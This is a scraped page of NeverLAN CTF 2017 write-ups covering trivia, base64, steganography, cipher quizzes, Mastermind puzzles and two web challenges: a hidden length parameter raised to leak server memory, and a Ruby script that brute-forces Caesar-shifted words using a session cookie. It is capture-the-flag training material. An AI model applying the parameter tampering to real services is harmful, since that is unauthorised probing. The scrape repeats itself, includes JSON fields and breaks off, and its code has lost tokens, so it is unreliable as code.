/vx4z/scea/b/hq2iksi7rufjaedu/gf5ivmlzahq+1jsxni/p8a+fhxw1dwhrdwglbbnt3bzlay 26919         0x6927          unix path: /g9ya7q2ig9/4sko4xz1zss1b/afycehbbrxxjjlmapufiimmec/dd4van4j1k8uibwym1 29935         0x74ef          unix path: /ai/ptd3ivudkzwopswp/ai7x2xdzldg7m20ae5r8q/2lvhlfed4yeil/ 33346         0x8242          unix path: /8d2v8h6gahraduc54969p/aj8x/8acc/h 35802         0x8bda          unix path: /kvzns/bo8a61ebdzjlfghkzuaor1/ovn74k/fc58q 36928         0x9040          unix path: /klcp/1giwfy1z2ssrixwx5to/vyrq4ilu/fsixlylb5mucoaplj/xrkufev1e4s4k/nygb 42880         0xa780          unix path: /a/e/hdrqwxbwk1y/pqu4uf+i/1r4a1ihrjysj93x07100am 43257         0xa8f9          unix path: /z8yukjgpsany/ebz8p6bqwdg/2vm/ij5h5gsq/8k3fmc0bxzpuyd0ki 49189         0xc025          unix path: /rtr4uwlzdob3z/kvfv2z/gr8ufgaewhfdaalatoo3y/ehduf1a/c 50244         0xc444          unix path: /ljkcghrv/rnxom6pfljmt/lknhzr3wgpmr5aa2/xvteg5f3k0bn6hh+fwqprmnhtbwmi7rob95b 53176         0xcfb8          unix path: /8e7tbw30/xjresflytmlve5/igswa/ja+hzkq6oaqs6yp0pmkqipqh9ikxzpt7tvml5ry 55034         0xd6fa          unix path: /wbivxnbfomn6hp91bfwyspsy/ugqx/dgpxa/wcfjtp+/wak+8fip90n8kpi 60216         0xeb38          unix path: /trd66liuarwaeewi6sdhv/u/lt/f1+19quuo 65339         0xff3b          unix path: /ambrzl/hb3ib/oi3x5mvadfxpswhbsz//9p4g8a+ab3vnm1hxqztjpem3kfossmvnkrlvwow 67005         0x105bd         stuffit deluxe segment (data): fpw74o1el5vrgobi3phrkc [...] so let's extract the base64 string, join it, decode it and save the ouput in a file (with a ruby script of course). require \"base64\" line_no = selfie_b64 = file.open( \"email.txt\" |file| file.each |line| line_no >= && line_no <= 12617 selfie_b64 += line.chomp line_no += selfie_plain = base64.decode64(selfie_b64) file.open( \"selfie.jpg\" |file| file.write(selfie_plain) i obtained this picture: $ file selfie.jpg selfie.jpg: jpeg image data, jfif standard 1.01, aspect ratio, density 72x72, segment length 16, exif standard: [tiff image data, big-endian, direntries=2, orientation=upper-left], baseline, precision 8, 820x618, frames 3 this image seems to hide something else (trailing data): $ binwalk selfie.jpg decimal       hexadecimal     description -------------------------------------------------------------------------------- 0             0x0             jpeg image data, jfif standard 1.01 30            0x1e            tiff image data, big-endian, offset of first image directory: 8 128969        0x1f7c9         zip archive data, at least v2.0 to extract, name: death_star_owner&apos;s_technical_manual_blueprints.jpg 712883        0xae0b3         zip archive data, at least v1.0 to extract, name: __macosx/ 712938        0xae0ea         zip archive data, at least v2.0 to extract, name: __macosx/._death_star_owner&apos;s_technical_manual_blueprints.jpg 713908        0xae4b4         end of zip archive then i extracted it with foremost and unzip the archive: $ unzip 00000251.zip archive:  00000251.zip inflating: death_star_owner&apos;s_technical_manual_blueprints.jpg creating: __macosx/ inflating: __macosx/._death_star_owner&apos;s_technical_manual_blueprints.jpg finally, i get this death star elevation plan: flag is rebellions_are_built_on_hope note : this is steganography, not forensics. 100 - thehistoryofcryptography - cryptography the_history_of_cryptography.zip contains two files: 0.txt 1.zip $ cat 0.txt this shifty cipher is one of the simplest, and most well know ciphers. answer: caesar the zip is password protected and the password is the answer of 0.txt 1.zip contains 2 files: 1.txt 2.zip , and so on. $ cat 1.txt this cipher is is named after the person who made it famous, not but the man who first created it. password:\"the name of cipher in the riddle\" with out the quotes. answer: vigenere $ cat 2.txt this transposition cipher was used by the warriors in the famous movie \"the 300\" password:\"the name of cipher in the riddle\" with out the quotes. answer: scytale $ cat 3.txt the first recorded use of this cipher was used to hide a book of magic. password:\"the name of cipher in the riddle\" with out the quotes. answer: steganography details $ cat 4.txt this world famous cipher was invented by arthur scherbius password:\"the name of cipher in the riddle\" with out the quotes. answer: enigma machine details $ cat 5.txt which one is you&apos;re favorite? i love them all because... flag{thehistoryofcryptographyisaw3s0m3} flag is thehistoryofcryptographyisaw3s0m3 note : this challenge was a quizz, not a cryptography challenge. it should have been in trivia, misc, quizz or other. 100 - a slight cut - web http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/ source: <!doctype html> <html> <head> <title>a slight cut</title> <script> [...] </script> </head> <body> <div> <h1>type in some text to have the server repeat it back</h1> <form onsubmit=\"getecho(); return false;\"> <input id=\"text\" name=\"text\" type=\"text\" placeholder=\"type some text here\"/> <input id=\"length\" type=\"hidden\" name=\"length\" value=\"0\"/> <input type=\"submit\"/> </form> <p id=\"echo\">output will appear here</p> </div> </body> </html> there is two parameters in te request url: length text text comes from the input field, and length is calculated with javascript. function getecho text = $( '#text' ).val(); length = $( '#length' ).val(); $.ajax( 'echo.php?length=' +length+ '&text=' +text).done( function echoed '#echo' ).text(echoed); document ).ready( function '#text' ).on( 'input' function '#length' ).val($( '#text' ).val().length); if i submit , the calculated length is get /echo.php?length=1&text=a http/1.1 host: neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123 user-agent: mozilla/5.0 (x11; linux x86_64; rv:51.0) gecko/20100101 firefox/51.0 accept: */* accept-language: en-us,en;q=0.5 accept-encoding: gzip, deflate referer: http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/ x-requested-with: xmlhttprequest connection: close but what will happen if i change the value from 1 to 1000 with burp: get /echo.php?length=1000&text=a http/1.1 the server displays more than intended: [email\u00a0protected] kds2^4a ady 5 tyusft tuyuy_#65afajty ajb tjuflt ty%&(juuyttyjtji key: flag{bleeding_in_javascript} sdf4 asd6f ayj1dsgff@ af ttmtum56tu$%ga wrg3@#%aa9-mtyumty dfgsaumg68g$%ershe as 9tuyt t9uty38dsdfg-5f htyd45s#$ flag is: bleeding_in_javascript 300 - webcipher - web #anti-human http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/ word list: https://s3-us-west-2.amazonaws.com/neverlanctf/files/words.txt source: <!doctype html> html head title anti-human cipher title head body \"cipher_box\" \"cipher\" shhsjwfl \"form_box\" form \"form\" method \"get\" action input type \"text\" name \"deciphered\" \"deciphered\" input type \"submit\" form body html first thing is to understand what to do. here is what the server do: a word is picked up randomly from words.txt this word is randomly rotated (caesar cipher with a shift between 1 and 25) then the shifted word is displayed for a few seconds a new word is picked up and so on... so we need a script that: get the shifted word cross the dictionary and test words one by one (only same length as teh shifted word) for each tested word try all possible shifting break when that match send the answer (decipered/unshifted word) get the flag so that's what i did with a ruby script and curb $ ruby webcipher.rb \u2022 connexion works \u2022 cracking ciphered word \u2022 deciphered: cassidony \u2022 sending answer \u2022 flag: c34s3r_c1ph3r_70_7h3_m4x my ruby script: #!/usr/bin/env ruby require 'curb' # for get/post requests # from https://gist.github.com/matugm/db363c7131e6af27716c caesar_cipher (string, shift = alphabet   = array( encrypter  = hash[alphabet.zip(alphabet.rotate(shift))] string.chars.map { encrypter.fetch(c, hostname = 'http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/index.php' c = curl::easy.new(hostname) |curl| curl.headers[ 'cookie' 'phpsessid=30ff4361f8af2985595bff7c9614b1f1' curl.headers[ 'referer' ] = hostname curl.headers[ 'upgrade-insecure-requests' #curl.verbose = true # curl c.perform # send the request c.body_str.match( /anti\\-human cipher/ puts '\u2022 connexion works' # get the cipher word ciphered_word = c.body_str.match( /<h1 id=\"cipher\">([a-za-z]*)<\\/h1>/ ).captures[ ciphered_word.downcase! # put lowercase ciphered_word_length = ciphered_word.length puts '\u2022 cracking ciphered word' do_break = false answer = file.open( \"words.txt\" |file| file.each |word| word.chomp! # remove spaces word.length.eql?(ciphered_word_length) # only try word with same length answer = word # save the word because it can be mixed case word.downcase! # put lowercase # puts \"word: #{word}\" ).each # puts caesar_cipher(word, i).join caesar_cipher(word, i).join == ciphered_word puts \"\u2022 deciphered: #{word} do_break = true break break do_break puts \"\u2022 sending answer\" c.url = hostname.concat( \"?deciphered= #{answer} c.perform puts \"\u2022 flag: \" .concat(c.body_str.match( /<p>flag{(.*)}<\\/p>/ ).captures[ note : this is not web, this is scripting. 50 - master mind 1 - other can you break my three digit lock? mastermind1.txt source: +-----------------------+ |       |       |       | |   7   |   3   |   6   | one number is correct but wrongly placed |       |       |       | |_______|_______|_______| |       |       |       | |   0   |   6   |   5   | one number is correct and correctly placed |       |       |       | |_______|_______|_______| |       |       |       | |   3   |   7   |   2   | two numbers are correct but wrongly placed |       |       |       | |_______|_______|_______| |       |       |       | |   6   |   4   |   7   | no numbers are correct |       |       |       | |_______|_______|_______| |       |       |       | |   5   |   2   |   4   | one number is correct and correctly placed |       |       |       | |       |       |       | +-----------------------+ rules: mastermind code-breaking: line 4: 647, no numbers are correct => [0,1,2,3,5,8,9] are possible line 1: 736, one number is correct but wrongly placed => 7 and 6 are wrong, so 3 is in the code and is right or left line 2: 065, one number is correct and correctly placed => 6 is wrong, so 0 or 5 is in the code and corrctly placed line 3: 372, two numbers are correct but wrongly placed => 7 is wrong, 3 and 2 are good so [3,2,[0|5]] are possible line 5: 524, one number is correct and correctly placed => only one number is correct, 2 is good so 5 is wrong and [3,2,0] are possible (we have the three numbers so now let's order them) line 5: 524, one number is correct and correctly placed => 2 is middle line 2: 065, one number is correct and correctly placed => 0 is left so 3 is right flag is 100 - master mind 2 - other i've upgraded my lock! can you solve it? mastermind2.txt source: +-------------------------------+ |       |       |       |       | |   9   |   5   |   3   |   2   | one number is correct but wrongly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   1   |   6   |   7   |   3   | two numbers are correct and correctly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   0   |   6   |   5   |   9   | two numbers are correct but wrongly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   2   |   4   |   3   |   8   | no numbers are correct |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   5   |   2   |   4   |   0   | one number is correct and correctly placed |       |       |       |       | |       |       |       |       | +-------------------------------+ rules: mastermind code-breaking: line 4: 2438, no numbers are correct => only [0,1,5,6,7,9] are possible line 5: 5240, one number is correct and correctly placed => 2 and 4 are wrong, so 0 or 5 is in the code, [[0|5],1,6,7,9] line 1: 9532, one number is correct but wrongly placed => 2 and 3 are wrong, so 9 or 5 is good, [0|5] & [5|9] = 5 so [1,5,6,7] or [0|5] & [5|9] = [0,9] so so [0,1,6,7,9] line 2: 1673, two numbers are correct and correctly placed => only two number are good so [1,5,6,7] impossible so [0,1,6,7,9] is only possible (now we need to filter the 5 numbers to keep only 4) line 1: confirmed [9], possible [0,1,6,7] line 3: confirmed [9,[0|6]], possible [1,7] line 5: confirmed [9,0], possible [1,7] so [0,1,7,9] are the four numbers (we have the four numbers so now let's order them) line 2: place [1,x,7,x] line 5: place [1,x,7,0] so  [1,9,7,0] flag is 1970 share please enable javascript to view the comments powered by disqus. follow: newer xiomara ctf 2017 - write-ups older ruby cheat sheet with examples recents security writeups uiuctf 2017 - 100 - high school crypto - crypto sunday 30 april 2017 (2017-04-30) security writeups angstromctf 2017 - write-ups saturday 29 april 2017 (2017-04-29) security writeups breizhctf 2k17 - write-ups saturday 29 april 2017 (2017-04-29) security writeups yubitsec ctf 2017 - write-ups tuesday 25 april 2017 (2017-04-25) security writeups fit-hack ctf 2017 - write-ups saturday 15 april 2017 (2017-04-15) categories linux archlinux debian opensuse ubuntu misc news security warez programming python ruby security centos windows writeups windows tag cloud anonymity apache archlinux backdoor centos crypto debian firefox forensics graphic guessing hyper-v install linux misc netbios network news opensuse pentest piracy privacy programming proxy python qemu recon reverse reversing ruby security stegano system trivia ubuntu update usenet virtualbox virtualization vulnerability warez webshell windows writeups archives april 2017 march 2017 february 2017 january 2017 december 2016 november 2016 october 2016 september 2016 august 2016 july 2016 june 2016 may 2016 april 2016 march 2016 december 2015 october 2015 september 2015 november 2014 october 2014 september 2014 august 2014 december 2012 links hexo foss torrent is not a crime \u00a9 2017 alexandre zanni powered by hexo . theme by ppoffice custom scripts ssl redirect",
    "title": "Trivia Answers",
    "url": "http://rawsec.ml/en/NeverLAN-CTF-2017-write-ups/#50-encoding-apprentice-trivia"
  },
  {
    "meta_description": "",
    "meta_keywords": "",
    "meta_og_description": "Informations\nVersion\n\n\n\nBy\nVersion\nComment\n\n\n\n\nnoraj\n1.0\nCreation\n\n\n\nCTF\n\nName : NeverLAN CTF 2017\nWebsite : neverlanctf.com\nType : Online\nFormat : Jeopardy\nCTF Time : link\n\n50 - Encoding Apprentice -",
    "meta_og_title": "NeverLAN CTF 2017 - Write-ups",
    "meta_title": "",
    "meta_twitter_description": "",
    "meta_twitter_title": "",
    "score": 37.92185125943859,
    "tag_title": "",
    "tags": "",
    "text": "security is everywhere home linux news security about security writeups neverlan ctf 2017 - write-ups monday 27 february 2017 (2017-02-27) forensics security writeups informations version version comment noraj creation name : neverlan ctf 2017 website neverlanctf.com type : online format : jeopardy ctf time link 50 - encoding apprentice - trivia what common encoding practice\u2019s title contains the square of 8 and occasionally ends with an \u201c=\u201d, or \u201c==\u201d? answer: base64 50 - shifty ciphers\u2026 - trivia what cipher is the shiftiest of them all? he even has his own salad\u2026 answer: caesar 50 - know your extensions - trivia unix and linux use this (instead of a file extension) to determine what format a file is. answer: magic numbers 50 - mmmm... ssl - trivia what is the standard, secure, size of an ssl certificate? answer: 2048 50 - don't eat me - trivia i allow http to act as a stateful protocol instead of the stateless protocol it actually is. just a small piece of data sent from a website... answer: cookie 50 - neverlan - recon we've been known to leak things on twitter... go to neverlanctf twitter: https://twitter.com/neverlanctf there is an interesting twitter status rnfl erpba vf rnfl. synt{vas0ezngvba_vf_c0jre_xa0j_l0he_nqirefnel} #commoncaesercipher i tried a rot13 and i got that: easy recon is easy. flag{inf0rmation_is_p0wer_kn0w_y0ur_adversary} flag is inf0rmation_is_p0wer_kn0w_y0ur_adversary 100 - purvesta - recon purvesta also really likes his twitter... neverlan ctftime page: https://ctftime.org/team/32118 purvesta ctftime page: https://ctftime.org/user/23157 purvesta name is: tanner purves , his linkedin page is not working. so i searched for twitter tanner purves and found his twitter page @purvesta0704 his twitter descripton says: \\\\\\bsu &apos;20, co-founder of the neverlan ctf/// {zmxhz3txmhdfetb1x0fym19hzxr0aw5nx2cwmgrfyxrfvghpnx0=} it looks like a base64 string: $ printf %s &apos;zmxhz3txmhdfetb1x0fym19hzxr0aw5nx2cwmgrfyxrfvghpnx0=&apos; | base64 -d flag{w0w_y0u_ar3_getting_g00d_at_thi5} 50 - soyoulikemusic - forensics soyoulikemusic.class we can use strings on the java class: $ strings soyoulikemusic.class scan ljava/util/scanner; <init> code linenumbertable main ([ljava/lang/string;)v decompilingthecodenow qone stackmaptable qtwo qthree playgame sourcefile soyoulikemusic.java java/util/scanner oahh welcome... so i hear you like music? what might i call you fellow listener? java/lang/stringbuilder well 4, let&apos;s play a game and see how much you like music. uwho was the special artist to dj music for our live streams before the event started? s7a73farm try again... @now you are on a roll! what is zestyfe&apos;s favorite type of music? dubstep =final question! what is the name of purvesta&apos;s only rap song? the_gettysburg_address_rap |i will ask you three questions. if you can answer them all right, then i will point you towards your precious flag you seek! want to play? (y/n) ;great let&apos;s play! (ctrl-c if you really don&apos;t want to play) congratulations!! you did it!! 8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= soyoulikemusic java/lang/object java/lang/string java/lang/system ljava/io/inputstream; (ljava/io/inputstream;)v ljava/io/printstream; java/io/printstream println (ljava/lang/string;)v nextline ()ljava/lang/string; trim append -(ljava/lang/string;)ljava/lang/stringbuilder; tostring equals (ljava/lang/object;)z equalsignorecase (ljava/lang/string;)z exit (i)v focus on: congratulations!! you did it!! 8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= that looks like base64: printf %s &apos;8zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0=&apos; |base64 -d \ud927\udc45\ufffd\ufffdm\u0465\ufffd\ufffd}]\ufffd\ufffd\u0465\ufffd\ufffd}=\ufffd}\ufffd\ufffd\ufffd\u0655\ufffd\u0444\ufffd\ufffd}5\ufffd\ufffd\u0445\ufffd\ufffd\ufffdbase64: invalid input that's wrong let's execute the java class, we know teh answers: $ java -cp . soyoulikemusic ahh welcome... so i hear you like music? what might i call you fellow listener? alex well alex, let&apos;s play a game and see how much you like music. i will ask you three questions. if you can answer them all right, then i will point you towards your precious flag you seek! want to play? (y/n) great let&apos;s play! (ctrl-c if you really don&apos;t want to play) who was the special artist to dj music for our live streams before the event started? s7a73farm now you are on a roll! what is zestyfe&apos;s favorite type of music? dubstep final question! what is the name of purvesta&apos;s only rap song? the_gettysburg_address_rap congratulations!! you did it!! zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0= there was only a before our base64 string: $ printf %s &apos;zmxhz3ttdglsbf9xywl0aw5nx09ux3b1cnzlc3rhj3nftwl4dgfwzx0=&apos; | base64 -di flag{still_waiting_on_purvesta&apos;s_mixtape} note : this is not forensics. 300 - just-a-selfie - forensics you've been put in charge of a very secret project. there's talk that some of your data has leaked out. your security analyst has flagged this email as \"out of place\". has your company been breached? hmm.. binwalk. now that's a useful tool! $ file email.txt email.txt: smtp mail, ascii text this is a mail with a attached image. --apple-mail=_9c94b8c8-a2cf-4892-8e1b-a89a4c3eae03 content-transfer-encoding: base64 content-disposition: inline; filename=selfie.jpg content-type: image/jpeg; x-unix-mode=0644; name=\"selfie.jpg\" content-id: < [email\u00a0protected] the image is base64 encoded, and split between line 92 and line 12617. of course, binwalk is useless here: 1369          0x559           html document header 4003          0xfa3           html document footer 9689          0x25d9          unix path: /wqckbqxdjshoqrujuixzonp/kk81v7p/kjzn4bfg73qguf/0pu9 11085         0x2b4d          unix path: /4rd4z6zcuzzplnxirjby/i/qgv9n/dfxvl4aeo+t0 13229         0x33ad          unix path: /enn/y/huxtvl8wx5yrjljz/xfcvzqtpdqfrph3dhfzntj8ek7l4h3 13284         0x33e4          unix path: /nakvugimce9bjok2f2dpax8c/f/w/p+zfd9pw4ka4+sp5mz7dk8oeijhsjktn7js/sc0pxnmnsl 14560         0x38e0          unix path: /wcei0l/aj8i/wdvqtxbcooy/ktz6uv2 15287         0x3bb7          unix path: /qk6f4i/c/vfhgu/wbs+mdbxxmhweuzirfiuagaquon1p0rxlrvlc+hdp6rri8rvvdfhtxrpk8h 22696         0x58a8          unix path: /8e/ke8hmukjewaobkde/9c/jvzihnpfvmr2or8qzwppjhfvqm7ngjsdwt 23242         0x5aca          unix path: /jivyx2f9h6ljj/p/j/gvqmszd+0kcm1zrcqbhuh7wgielgamcy 25527         0x63b7          unix path: /vx4z/scea/b/hq2iksi7rufjaedu/gf5ivmlzahq+1jsxni/p8a+fhxw1dwhrdwglbbnt3bzlay 26919         0x6927          unix path: /g9ya7q2ig9/4sko4xz1zss1b/afycehbbrxxjjlmapufiimmec/dd4van4j1k8uibwym1 29935         0x74ef          unix path: /ai/ptd3ivudkzwopswp/ai7x2xdzldg7m20ae5r8q/2lvhlfed4yeil/ 33346         0x8242          unix path: /8d2v8h6gahraduc54969p/aj8x/8acc/h 35802         0x8bda          unix path: /kvzns/bo8a61ebdzjlfghkzuaor1/ovn74k/fc58q 36928         0x9040          unix path: /klcp/1giwfy1z2ssrixwx5to/vyrq4ilu/fsixlylb5mucoaplj/xrkufev1e4s4k/nygb 42880         0xa780          unix path: /a/e/hdrqwxbwk1y/pqu4uf+i/1r4a1ihrjysj93x07100am 43257         0xa8f9          unix path: /z8yukjgpsany/ebz8p6bqwdg/2vm/ij5h5gsq/8k3fmc0bxzpuyd0ki 49189         0xc025          unix path: /rtr4uwlzdob3z/kvfv2z/gr8ufgaewhfdaalatoo3y/ehduf1a/c 50244         0xc444          unix path: /ljkcghrv/rnxom6pfljmt/lknhzr3wgpmr5aa2/xvteg5f3k0bn6hh+fwqprmnhtbwmi7rob95b 53176         0xcfb8          unix path: /8e7tbw30/xjresflytmlve5/igswa/ja+hzkq6oaqs6yp0pmkqipqh9ikxzpt7tvml5ry 55034         0xd6fa          unix path: /wbivxnbfomn6hp91bfwyspsy/ugqx/dgpxa/wcfjtp+/wak+8fip90n8kpi 60216         0xeb38          unix path: /trd66liuarwaeewi6sdhv/u/lt/f1+19quuo 65339         0xff3b          unix path: /ambrzl/hb3ib/oi3x5mvadfxpswhbsz//9p4g8a+ab3vnm1hxqztjpem3kfossmvnkrlvwow 67005         0x105bd         stuffit deluxe segment (data): fpw74o1el5vrgobi3phrkc [...] so let's extract the base64 string, join it, decode it and save the ouput in a file (with a ruby script of course). require \"base64\" line_no = selfie_b64 = file.open( \"email.txt\" |file| file.each |line| line_no >= && line_no <= 12617 selfie_b64 += line.chomp line_no += selfie_plain = base64.decode64(selfie_b64) file.open( \"selfie.jpg\" |file| file.write(selfie_plain) i obtained this picture: $ file selfie.jpg selfie.jpg: jpeg image data, jfif standard 1.01, aspect ratio, density 72x72, segment length 16, exif standard: [tiff image data, big-endian, direntries=2, orientation=upper-left], baseline, precision 8, 820x618, frames 3 this image seems to hide something else (trailing data): $ binwalk selfie.jpg decimal       hexadecimal     description -------------------------------------------------------------------------------- 0             0x0             jpeg image data, jfif standard 1.01 30            0x1e            tiff image data, big-endian, offset of first image directory: 8 128969        0x1f7c9         zip archive data, at least v2.0 to extract, name: death_star_owner&apos;s_technical_manual_blueprints.jpg 712883        0xae0b3         zip archive data, at least v1.0 to extract, name: __macosx/ 712938        0xae0ea         zip archive data, at least v2.0 to extract, name: __macosx/._death_star_owner&apos;s_technical_manual_blueprints.jpg 713908        0xae4b4         end of zip archive then i extracted it with foremost and unzip the archive: $ unzip 00000251.zip archive:  00000251.zip inflating: death_star_owner&apos;s_technical_manual_blueprints.jpg creating: __macosx/ inflating: __macosx/._death_star_owner&apos;s_technical_manual_blueprints.jpg finally, i get this death star elevation plan: flag is rebellions_are_built_on_hope note : this is steganography, not forensics. 100 - thehistoryofcryptography - cryptography the_history_of_cryptography.zip contains two files: 0.txt 1.zip $ cat 0.txt this shifty cipher is one of the simplest, and most well know ciphers. answer: caesar the zip is password protected and the password is the answer of 0.txt 1.zip contains 2 files: 1.txt 2.zip , and so on. $ cat 1.txt this cipher is is named after the person who made it famous, not but the man who first created it. password:\"the name of cipher in the riddle\" with out the quotes. answer: vigenere $ cat 2.txt this transposition cipher was used by the warriors in the famous movie \"the 300\" password:\"the name of cipher in the riddle\" with out the quotes. answer: scytale $ cat 3.txt the first recorded use of this cipher was used to hide a book of magic. password:\"the name of cipher in the riddle\" with out the quotes. answer: steganography details $ cat 4.txt this world famous cipher was invented by arthur scherbius password:\"the name of cipher in the riddle\" with out the quotes. answer: enigma machine details $ cat 5.txt which one is you&apos;re favorite? i love them all because... flag{thehistoryofcryptographyisaw3s0m3} flag is thehistoryofcryptographyisaw3s0m3 note : this challenge was a quizz, not a cryptography challenge. it should have been in trivia, misc, quizz or other. 100 - a slight cut - web http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/ source: <!doctype html> <html> <head> <title>a slight cut</title> <script> [...] </script> </head> <body> <div> <h1>type in some text to have the server repeat it back</h1> <form onsubmit=\"getecho(); return false;\"> <input id=\"text\" name=\"text\" type=\"text\" placeholder=\"type some text here\"/> <input id=\"length\" type=\"hidden\" name=\"length\" value=\"0\"/> <input type=\"submit\"/> </form> <p id=\"echo\">output will appear here</p> </div> </body> </html> there is two parameters in te request url: length text text comes from the input field, and length is calculated with javascript. function getecho text = $( '#text' ).val(); length = $( '#length' ).val(); $.ajax( 'echo.php?length=' +length+ '&text=' +text).done( function echoed '#echo' ).text(echoed); document ).ready( function '#text' ).on( 'input' function '#length' ).val($( '#text' ).val().length); if i submit , the calculated length is get /echo.php?length=1&text=a http/1.1 host: neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123 user-agent: mozilla/5.0 (x11; linux x86_64; rv:51.0) gecko/20100101 firefox/51.0 accept: */* accept-language: en-us,en;q=0.5 accept-encoding: gzip, deflate referer: http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/ x-requested-with: xmlhttprequest connection: close but what will happen if i change the value from 1 to 1000 with burp: get /echo.php?length=1000&text=a http/1.1 the server displays more than intended: [email\u00a0protected] kds2^4a ady 5 tyusft tuyuy_#65afajty ajb tjuflt ty%&(juuyttyjtji key: flag{bleeding_in_javascript} sdf4 asd6f ayj1dsgff@ af ttmtum56tu$%ga wrg3@#%aa9-mtyumty dfgsaumg68g$%ershe as 9tuyt t9uty38dsdfg-5f htyd45s#$ flag is: bleeding_in_javascript 300 - webcipher - web #anti-human http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/ word list: https://s3-us-west-2.amazonaws.com/neverlanctf/files/words.txt source: <!doctype html> html head title anti-human cipher title head body \"cipher_box\" \"cipher\" shhsjwfl \"form_box\" form \"form\" method \"get\" action input type \"text\" name \"deciphered\" \"deciphered\" input type \"submit\" form body html first thing is to understand what to do. here is what the server do: a word is picked up randomly from words.txt this word is randomly rotated (caesar cipher with a shift between 1 and 25) then the shifted word is displayed for a few seconds a new word is picked up and so on... so we need a script that: get the shifted word cross the dictionary and test words one by one (only same length as teh shifted word) for each tested word try all possible shifting break when that match send the answer (decipered/unshifted word) get the flag so that's what i did with a ruby script and curb $ ruby webcipher.rb \u2022 connexion works \u2022 cracking ciphered word \u2022 deciphered: cassidony \u2022 sending answer \u2022 flag: c34s3r_c1ph3r_70_7h3_m4x my ruby script: #!/usr/bin/env ruby require 'curb' # for get/post requests # from https://gist.github.com/matugm/db363c7131e6af27716c caesar_cipher (string, shift = alphabet   = array( encrypter  = hash[alphabet.zip(alphabet.rotate(shift))] string.chars.map { encrypter.fetch(c, hostname = 'http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/index.php' c = curl::easy.new(hostname) |curl| curl.headers[ 'cookie' 'phpsessid=30ff4361f8af2985595bff7c9614b1f1' curl.headers[ 'referer' ] = hostname curl.headers[ 'upgrade-insecure-requests' #curl.verbose = true # curl c.perform # send the request c.body_str.match( /anti\\-human cipher/ puts '\u2022 connexion works' # get the cipher word ciphered_word = c.body_str.match( /<h1 id=\"cipher\">([a-za-z]*)<\\/h1>/ ).captures[ ciphered_word.downcase! # put lowercase ciphered_word_length = ciphered_word.length puts '\u2022 cracking ciphered word' do_break = false answer = file.open( \"words.txt\" |file| file.each |word| word.chomp! # remove spaces word.length.eql?(ciphered_word_length) # only try word with same length answer = word # save the word because it can be mixed case word.downcase! # put lowercase # puts \"word: #{word}\" ).each # puts caesar_cipher(word, i).join caesar_cipher(word, i).join == ciphered_word puts \"\u2022 deciphered: #{word} do_break = true break break do_break puts \"\u2022 sending answer\" c.url = hostname.concat( \"?deciphered= #{answer} c.perform puts \"\u2022 flag: \" .concat(c.body_str.match( /<p>flag{(.*)}<\\/p>/ ).captures[ note : this is not web, this is scripting. 50 - master mind 1 - other can you break my three digit lock? mastermind1.txt source: +-----------------------+ |       |       |       | |   7   |   3   |   6   | one number is correct but wrongly placed |       |       |       | |_______|_______|_______| |       |       |       | |   0   |   6   |   5   | one number is correct and correctly placed |       |       |       | |_______|_______|_______| |       |       |       | |   3   |   7   |   2   | two numbers are correct but wrongly placed |       |       |       | |_______|_______|_______| |       |       |       | |   6   |   4   |   7   | no numbers are correct |       |       |       | |_______|_______|_______| |       |       |       | |   5   |   2   |   4   | one number is correct and correctly placed |       |       |       | |       |       |       | +-----------------------+ rules: mastermind code-breaking: line 4: 647, no numbers are correct => [0,1,2,3,5,8,9] are possible line 1: 736, one number is correct but wrongly placed => 7 and 6 are wrong, so 3 is in the code and is right or left line 2: 065, one number is correct and correctly placed => 6 is wrong, so 0 or 5 is in the code and corrctly placed line 3: 372, two numbers are correct but wrongly placed => 7 is wrong, 3 and 2 are good so [3,2,[0|5]] are possible line 5: 524, one number is correct and correctly placed => only one number is correct, 2 is good so 5 is wrong and [3,2,0] are possible (we have the three numbers so now let's order them) line 5: 524, one number is correct and correctly placed => 2 is middle line 2: 065, one number is correct and correctly placed => 0 is left so 3 is right flag is 100 - master mind 2 - other i've upgraded my lock! can you solve it? mastermind2.txt source: +-------------------------------+ |       |       |       |       | |   9   |   5   |   3   |   2   | one number is correct but wrongly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   1   |   6   |   7   |   3   | two numbers are correct and correctly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   0   |   6   |   5   |   9   | two numbers are correct but wrongly placed |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   2   |   4   |   3   |   8   | no numbers are correct |       |       |       |       | |_______|_______|_______|_______| |       |       |       |       | |   5   |   2   |   4   |   0   | one number is correct and correctly placed |       |       |       |       | |       |       |       |       | +-------------------------------+ rules: mastermind code-breaking: line 4: 2438, no numbers are correct => only [0,1,5,6,7,9] are possible line 5: 5240, one number is correct and correctly placed => 2 and 4 are wrong, so 0 or 5 is in the code, [[0|5],1,6,7,9] line 1: 9532, one number is correct but wrongly placed => 2 and 3 are wrong, so 9 or 5 is good, [0|5] & [5|9] = 5 so [1,5,6,7] or [0|5] & [5|9] = [0,9] so so [0,1,6,7,9] line 2: 1673, two numbers are correct and correctly placed => only two number are good so [1,5,6,7] impossible so [0,1,6,7,9] is only possible (now we need to filter the 5 numbers to keep only 4) line 1: confirmed [9], possible [0,1,6,7] line 3: confirmed [9,[0|6]], possible [1,7] line 5: confirmed [9,0], possible [1,7] so 